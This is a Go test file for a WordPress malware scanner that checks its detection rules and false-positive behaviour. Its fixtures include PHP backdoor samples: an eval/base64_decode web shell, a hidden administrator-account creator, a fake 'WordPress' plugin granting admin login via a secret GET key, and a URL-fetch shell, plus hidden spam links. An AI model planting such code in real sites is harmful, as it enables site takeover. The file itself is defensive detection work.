package scan

import (
	"bufio"
	"crypto/sha256"
	"encoding/hex"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

const evalSample = "<?php\n$x = 1;\neval(base64_decode($_POST['x']));\n"

const createAdminSample = `<?php
add_action('init', function () {
    $login = 'wp_support'; $passw = 'p'; $email = 'a@b.c';
    if ( !username_exists( $login )  && !email_exists( $email ) ) {
        $user_id = wp_create_user( $login, $passw, $email );
        $user = new WP_User( $user_id );
        $user->set_role( 'administrator' );
    }
});
`

const cleanSample = "<?php\nfunction theme_setup() { add_theme_support('title-tag'); }\nadd_action('after_setup_theme', 'theme_setup');\n"

// contractTestSample mirrors the bespoke-plugin contract test that Wordfence's
// indeex.infector rule flags: it reads sibling source with file_get_contents
// and never executes it. Our rules must stay quiet on it.
const contractTestSample = "<?php\n$root = dirname(__DIR__);\n$decision = file_get_contents($root . '/includes/Admin/Service.php');\nif (strpos($decision, 'class Service') === false) { echo 'missing'; exit(1); }\n"

func write(t *testing.T, dir, rel, content string) string {
	t.Helper()
	p := filepath.Join(dir, filepath.FromSlash(rel))
	if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(p, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
	return p
}

func sum(s string) string {
	h := sha256.Sum256([]byte(s))
	return hex.EncodeToString(h[:])
}

func ids(f []Finding) []string {
	var out []string
	for _, x := range f {
		out = append(out, x.RuleID)
	}
	return out
}

func has(f []Finding, id string) bool {
	for _, x := range f {
		if x.RuleID == id {
			return true
		}
	}
	return false
}

func TestEngineSemantics(t *testing.T) {
	rs := &RuleSet{Version: 2, Rules: []Rule{
		{ID: "eval", Name: "eval", Severity: "critical", Prefilter: []string{"eval"}, Patterns: []string{`eval\s*\(\s*base64_decode`}},
		{ID: "require-all", Name: "both", Severity: "high", Require: []string{`wp_create_user`, `set_role`}, ExcludePaths: []string{"vendor/"}},
		{ID: "js-only", Name: "js", Severity: "low", FileTypes: []string{"js"}, Patterns: []string{`atob`}},
		{ID: "scoped", Name: "scoped", Severity: "low", IncludePaths: []string{"uploads/"}, Patterns: []string{`<\?php`}},
		{ID: "broken", Name: "broken", Severity: "low", Patterns: []string{`(`}},
	}, Hashes: []HashIOC{{SHA256: sum("IOC"), Name: "ioc file", Severity: "critical"}},
		AllowHashes: []string{sum(evalSample)}}

	s := New(rs, Options{Workers: 2})
	if len(s.Errors) != 1 || s.RuleCount() != 4 {
		t.Fatalf("expected 1 compile error and 4 rules, got %v / %d", s.Errors, s.RuleCount())
	}

	dir := t.TempDir()
	write(t, dir, "plugins/a/eval.php", "<?php eval ( base64_decode('x'));")
	write(t, dir, "plugins/a/admin.php", createAdminSample)
	write(t, dir, "vendor/x/admin.php", createAdminSample)
	write(t, dir, "themes/t/app.js", "var u = atob('aHR0cA==');")
	write(t, dir, "themes/t/app.php", "<?php $u = 'atob';")
	write(t, dir, "uploads/2026/x.php", "<?php echo 1;")
	write(t, dir, "plugins/b/x.php", "<?php echo 1;")
	write(t, dir, ".git/hooks/evil.php", "<?php eval(base64_decode('x'));")
	write(t, dir, "uploads/ioc.bin", "IOC")
	write(t, dir, "plugins/allowed.php", evalSample)

	res := s.ScanDir(dir)
	if len(res.Errors) != 0 {
		t.Fatalf("errors: %v", res.Errors)
	}
	got := map[string][]string{}
	for _, f := range res.Findings {
		got[f.File] = append(got[f.File], f.RuleID)
	}
	want := map[string][]string{
		"plugins/a/eval.php":  {"eval"},
		"plugins/a/admin.php": {"require-all"},
		"themes/t/app.js":     {"js-only"},
		"uploads/2026/x.php":  {"scoped"},
		"uploads/ioc.bin":     {"hash:" + sum("IOC")[:12]},
	}
	for file, rules := range want {
		if strings.Join(got[file], ",") != strings.Join(rules, ",") {
			t.Errorf("%s: want %v got %v", file, rules, got[file])
		}
	}
	for file := range got {
		if _, ok := want[file]; !ok {
			t.Errorf("unexpected finding on %s: %v", file, got[file])
		}
	}
	for _, f := range res.Findings {
		if f.File == "plugins/a/eval.php" && f.Line != 1 {
			t.Errorf("line: want 1 got %d", f.Line)
		}
		if f.SHA256 == "" {
			t.Errorf("%s: missing sha256", f.File)
		}
	}
	// Ten files written; the .git one is skipped by the walk, the rest are
	// scanned (hash indicators cover every extension).
	if res.Scanned != 9 {
		t.Errorf("counters: scanned=%d skipped=%d", res.Scanned, res.Skipped)
	}

	// KnownGood hook short-circuits before rules run.
	s2 := New(rs, Options{Workers: 1, KnownGood: func(h string) bool { return h == sum("<?php eval ( base64_decode('x'));") }})
	f, _ := s2.ScanFile(filepath.Join(dir, "plugins/a/eval.php"), "plugins/a/eval.php")
	if len(f) != 0 {
		t.Errorf("KnownGood not honored: %v", ids(f))
	}

	// Legacy shape carries the fields the malware-alert ingest reads.
	lf := res.Findings[0].Legacy()
	if lf.Filename == "" || lf.SignatureID == "" || lf.SignatureName == "" {
		t.Errorf("legacy conversion incomplete: %+v", lf)
	}
}

func TestV1RuleFileStillLoads(t *testing.T) {
	rs, err := ParseRuleSet([]byte(`[{"id":"a","name":"A","severity":"high","patterns":["foo"],"exclude_paths":["x/"]}]`))
	if err != nil {
		t.Fatal(err)
	}
	if rs.Version != 1 || len(rs.Rules) != 1 || rs.Rules[0].ExcludePaths[0] != "x/" {
		t.Fatalf("v1 parse: %+v", rs)
	}
}

func TestExtensions(t *testing.T) {
	got := strings.Join(Extensions([]string{"js", ".txt", "JS"}), ",")
	if got != ".js,.mjs,.txt" {
		t.Errorf("Extensions: %s", got)
	}
	if strings.Join(Extensions(nil), ",") != ".inc,.phar,.php,.php5,.php7,.php8,.phtml" {
		t.Errorf("default extensions: %v", Extensions(nil))
	}
}

// shippedRules loads lib/malware-signatures.json from the repo.
func shippedRules(t *testing.T) *Scanner {
	t.Helper()
	rs, err := LoadRuleSet(filepath.Join("..", "lib", "malware-signatures.json"))
	if err != nil {
		t.Fatal(err)
	}
	s := New(rs, Options{})
	for _, e := range s.Errors {
		t.Errorf("shipped rule failed to compile: %v", e)
	}
	return s
}

func TestShippedRules(t *testing.T) {
	s := shippedRules(t)
	if s.RuleCount() < 30 || s.HashCount() < 8 {
		t.Fatalf("shipped rule set too small: %d rules, %d hashes", s.RuleCount(), s.HashCount())
	}
	dir := t.TempDir()
	write(t, dir, "themes/custom/functions.php", createAdminSample)
	write(t, dir, "plugins/x/x.php", evalSample)
	write(t, dir, "themes/custom/clean.php", cleanSample)
	write(t, dir, "plugins/bespoke/tests/phase10.php", contractTestSample)
	res := s.ScanDir(dir)
	if len(res.Errors) != 0 {
		t.Fatalf("errors: %v", res.Errors)
	}
	by := map[string][]Finding{}
	for _, f := range res.Findings {
		by[f.File] = append(by[f.File], f)
	}
	if !has(by["themes/custom/functions.php"], "createadmin") {
		t.Errorf("createadmin sample not caught: %v", ids(by["themes/custom/functions.php"]))
	}
	if !has(by["plugins/x/x.php"], "eval-decode-chain") {
		t.Errorf("eval sample not caught: %v", ids(by["plugins/x/x.php"]))
	}
	for _, clean := range []string{"themes/custom/clean.php", "plugins/bespoke/tests/phase10.php"} {
		if len(by[clean]) != 0 {
			t.Errorf("false positive on %s: %v", clean, ids(by[clean]))
		}
	}
}

// Legitimate code shapes that the first clean-tree run flagged. None may
// produce a finding at high or critical severity.
func TestShippedRulesStayQuietOnLegitimateCode(t *testing.T) {
	s := shippedRules(t)
	dir := t.TempDir()
	write(t, dir, "plugins/simple-history/inc/services/class-stealth-mode.php",
		"<?php\nadd_filter( 'all_plugins', [ $this, 'filter_all_plugins' ] );\n// Hide from the \"Go to Simple History\" link\nfunction filter_all_plugins( $plugins ) { if ( $this->is_stealth() ) { unset( $plugins[ $this->slug ] ); } return $plugins; }\n")
	write(t, dir, "plugins/fusion-builder/inc/class-fusion-form-auth-actions.php",
		"<?php\n$user = wp_signon( array( 'user_login' => $_POST['user'], 'user_password' => $_POST['pass'] ) );\nif ( ! is_wp_error( $user ) ) { wp_set_auth_cookie( $user_id, false, is_ssl() ); }\n")
	write(t, dir, "plugins/jetpack/extensions/blocks/premium-content/_inc/subscription-service/class-jwt.php",
		"<?php\nfor ( $i = 0; $i < $len; $i++ ) { $status |= ( ord( $signature[ $i ] ) ^ ord( $hash[ $i ] ) ); }\n")
	write(t, dir, "plugins/fusion-builder/inc/lib/inc/recaptcha/src/ReCaptcha/RequestMethod/Curl.php",
		"<?php\n$ch = curl_init(); $response = curl_exec($ch); exec($cmd);\n")
	write(t, dir, "plugins/wordpress-importer/vendor/brick/math/src/BigInteger.php",
		"<?php\nassert($condition, $message);\nassert( $pointer->isSpecial() );\n")
	write(t, dir, "plugins/wordpress-importer/php-toolkit/XML/class-xmlprocessor.php",
		"<?php\n$invalid = \"\\x00\\x09\\x0A\\x0D\\x20#/:<>?@[\\\\]^|\";\n")
	write(t, dir, "plugins/fusion-builder/front-end/fusion-frontend-combined.min.js",
		"var a=atob(e),n=new Uint8Array(a.length);fetch(u).then(r=>r.json());eval(\"[function _expression_function(){\"+v+\"}]\");")
	write(t, dir, "plugins/redirection/redirection.php", "<?php\nopcache_reset(); // phpcs:ignore\n")
	write(t, dir, "plugins/cleantalk-spam-protect/lib/Cleantalk/Common/SupportUser.php",
		"<?php\n$user = new WP_User( $user_id );\n$user->set_role('administrator');\n")
	write(t, dir, "plugins/seo-by-rank-math/includes/modules/sitemap/abstract-xml.php",
		"<?php\nheader( 'Cache-Control: no-cache, no-store, must-revalidate, max-age=0' );\n")
	write(t, dir, "plugins/wpforms-lite/src/Admin/PluginsCategory.php",
		"<?php\nadd_filter( 'plugins_list', [ $this, 'add_category' ] );\n")
	write(t, dir, "plugins/download-monitor/src/Shop/Session/Factory.php",
		"<?php\n$key = hash( 'sha256', get_option( 'session_key', true ) . $_SERVER['REMOTE_ADDR'] );\n")
	write(t, dir, "plugins/waterwoo-pdf-premium/lib/tcpdf/tcpdf/tcpdf_barcodes_1d.php",
		"<?php\n$chars = chr(0).chr(1).chr(2).chr(3).chr(4).chr(5).chr(6).chr(7).chr(8).chr(9);\n")
	write(t, dir, "plugins/mojo-marketplace-wp-plugin/vendor/bluehost/endurance-wp-module-sso/functions.php",
		"<?php\n$users = get_users( array( 'role' => 'administrator', 'number' => 1 ) );\nif ( isset( $users[0] ) ) { wp_set_auth_cookie( $users[0]->ID ); }\n")
	write(t, dir, "mu-plugins/captaincore-helper.php",
		"<?php\nif ( 'wp-login.php' !== $pagenow || empty( $_GET['user_id'] ) || empty( $_GET['captaincore_login_token'] ) ) { return; }\n$user = get_user_by( 'id', (int) $_GET['user_id'] );\nwp_set_auth_cookie( $user->ID );\n")
	write(t, dir, "uploads/backupbuddy_temp/abc/importbuddy.php",
		"<?php\n$fh = fopen( __FILE__, 'r' ); fseek( $fh, __COMPILER_HALT_OFFSET__ );\n")
	write(t, dir, "plugins/really-simple-ssl/security/wordpress/two-fa/class-rsssl-two-factor.php",
		"<?php\n$token = $_GET['rsssl_token'] ?? '';\nif ( hash_equals( $stored, $token ) ) { wp_set_auth_cookie( $user_id ); }\n")
	write(t, dir, "plugins/akismet/akismet.php",
		"<?php\n/**\n * Plugin Name: Akismet Anti-spam: Spam Protection\n * Author: Automattic - Anti-spam Team\n */\n")
	write(t, dir, "plugins/some-theme-helper/style.php",
		"<?php ?><a class=\"skip-link screen-reader-text\" href=\"#content\">Skip</a><style>.screen-reader-text{position:absolute;left:-9999px}</style>\n")
	write(t, dir, "plugins/capability-manager-enhanced/includes/roles/class/class-pp-roles-actions.php",
		"<?php\n$level = ($_REQUEST['current_role'] === 'administrator') ? 10 : absint($_REQUEST['role_level']);\n$role = get_role('administrator'); $user->set_role($_REQUEST['current_role']); wp_set_current_user($id);\n")
	write(t, dir, "plugins/buddyboss-platform/bp-core/admin/classes/class-bb-support-access.php",
		"<?php\n$id = wp_insert_user( array( 'user_login' => self::USER_LOGIN, 'user_email' => self::USER_EMAIL, 'role' => 'administrator' ) );\n")
	res := s.ScanDir(dir)
	for _, f := range res.Findings {
		if SeverityRank(f.Severity) >= SeverityRank("high") {
			t.Errorf("false positive at %s: %s on %s:%d %q", f.Severity, f.RuleID, f.File, f.Line, f.Match)
		}
	}
}

// Shapes written from the harvest corpus (synthetic stand-ins, not customer
// files). Each must fire at high or critical.
func TestShippedRulesCatchCorpusFamilies(t *testing.T) {
	s := shippedRules(t)
	dir := t.TempDir()
	cases := map[string]struct{ content, rule string }{
		"themes/x/vendor/lib/Header.php": {"<?php\nclass Header {}\n?><div style=\"position:absolute; left:-2083px; top:-2274px;\"><a href=\"http://example.invalid/dofa/pharmacy-express\">pharmacy express</a><a href=\"http://example.invalid/dofa/super-viagra-active\">super viagra active</a></div>\n", "hidden-pharma-links"},
		"themes/x/footer.php":            {"<?php get_footer(); ?>\n<div style=\"position:absolute; left:-9999px;\"><a href=\"https://example.invalid/a\">one</a><a href=\"https://example.invalid/b\">two</a><a href=\"https://example.invalid/c\">three</a></div>\n", "offscreen-link-block"},
		"mu-plugins/key.php":             {"<?php\n/**\n * Plugin Name: WordPress\n * Description: Auto-update request.\n * Version: 3.3\n * Author: WordPress\n */\ndefined('ABSPATH') || exit;\ndefine('WPK_SECRET_KEY', 'devupdate');\nadd_action('init', function () {\n    if (!isset($_GET['dev']) || $_GET['dev'] !== WPK_SECRET_KEY) { return; }\n    global $wpdb;\n    $admin_id = $wpdb->get_var(\"SELECT u.ID FROM {$wpdb->users} u INNER JOIN {$wpdb->usermeta} m ON u.ID = m.user_id WHERE m.meta_key = '{$wpdb->prefix}capabilities' AND m.meta_value LIKE '%administrator%' LIMIT 1\");\n    wp_set_auth_cookie($admin_id, true);\n});\n", "fake-wordpress-plugin-header"},
		"mu-plugins/key2.php":            {"<?php\ndefine('WPK_SECRET_KEY', 'devupdate');\nif ($_GET['dev'] !== WPK_SECRET_KEY) { exit; }\n$users = get_users(array('role' => 'administrator'));\nwp_set_auth_cookie($users[0]->ID);\n", "secret-key-admin-access"},
		"themes/x/pages/load.php":        {"<?php echo file_get_contents($_GET['url']); ?>\n", "request-controlled-fetch"},
		"themes/x/js.php":                {"<?php print(\"upload::http://nothing\");", "get-nothing-marker"},
	}
	for rel, c := range cases {
		write(t, dir, rel, c.content)
	}
	res := s.ScanDir(dir)
	by := map[string][]Finding{}
	for _, f := range res.Findings {
		by[f.File] = append(by[f.File], f)
	}
	for rel, c := range cases {
		found := false
		for _, f := range by[rel] {
			if f.RuleID == c.rule && SeverityRank(f.Severity) >= SeverityRank("high") {
				found = true
			}
		}
		if !found {
			t.Errorf("%s: expected %s at high+, got %v", rel, c.rule, ids(by[rel]))
		}
	}
}

// TestCorpus runs the shipped rules over the Wordfence ground-truth corpus
// when CAPTAINCORE_SCAN_CORPUS points at it (samples/ + index.tsv, optional
// negatives.txt of sha256 known to be Wordfence false positives). Every
// sample not listed as a negative must produce at least one finding.
func TestCorpus(t *testing.T) {
	corpus := os.Getenv("CAPTAINCORE_SCAN_CORPUS")
	if corpus == "" {
		t.Skip("CAPTAINCORE_SCAN_CORPUS not set")
	}
	negatives := map[string]bool{}
	if f, err := os.Open(filepath.Join(corpus, "negatives.txt")); err == nil {
		sc := bufio.NewScanner(f)
		for sc.Scan() {
			if h := strings.TrimSpace(strings.SplitN(sc.Text(), "#", 2)[0]); h != "" {
				negatives[h] = true
			}
		}
		f.Close()
	}
	// Family label per sample from the index, for the report.
	family := map[string]string{}
	if f, err := os.Open(filepath.Join(corpus, "index.tsv")); err == nil {
		sc := bufio.NewScanner(f)
		sc.Buffer(make([]byte, 1<<20), 1<<20)
		for sc.Scan() {
			cols := strings.Split(sc.Text(), "\t")
			if len(cols) >= 7 && family[cols[3]] == "" {
				family[cols[3]] = cols[6]
			}
		}
		f.Close()
	}
	s := shippedRules(t)
	// The corpus stores samples by hash with no extension; treat them as PHP
	// unless the recorded path says otherwise.
	entries, err := os.ReadDir(filepath.Join(corpus, "samples"))
	if err != nil {
		t.Fatal(err)
	}
	total, caught, missed := 0, 0, 0
	for _, e := range entries {
		h := e.Name()
		if negatives[h] {
			continue
		}
		total++
		path := filepath.Join(corpus, "samples", h)
		f, err := s.ScanFile(path, "plugins/corpus/"+h+".php")
		if err != nil {
			t.Errorf("%s: %v", h, err)
			continue
		}
		if len(f) > 0 {
			caught++
		} else {
			missed++
			t.Logf("MISS %s %s", h[:12], family[h])
		}
	}
	t.Logf("corpus: %d samples, %d caught, %d missed", total, caught, missed)
	if missed > 0 && os.Getenv("CAPTAINCORE_SCAN_CORPUS_REPORT_ONLY") == "" {
		t.Errorf("%d corpus samples produced no finding", missed)
	}
}

// TestCleanTree asserts zero findings over a known-clean tree (a WordPress
// core checkout, a wp.org plugin mirror) named by CAPTAINCORE_SCAN_CLEAN.
func TestCleanTree(t *testing.T) {
	clean := os.Getenv("CAPTAINCORE_SCAN_CLEAN")
	if clean == "" {
		t.Skip("CAPTAINCORE_SCAN_CLEAN not set")
	}
	s := shippedRules(t)
	res := s.ScanDir(clean)
	for _, f := range res.Findings {
		t.Errorf("false positive: %s %s:%d %s", f.RuleID, f.File, f.Line, f.Match)
	}
	t.Logf("clean tree: %d files scanned, %d findings", res.Scanned, len(res.Findings))
}
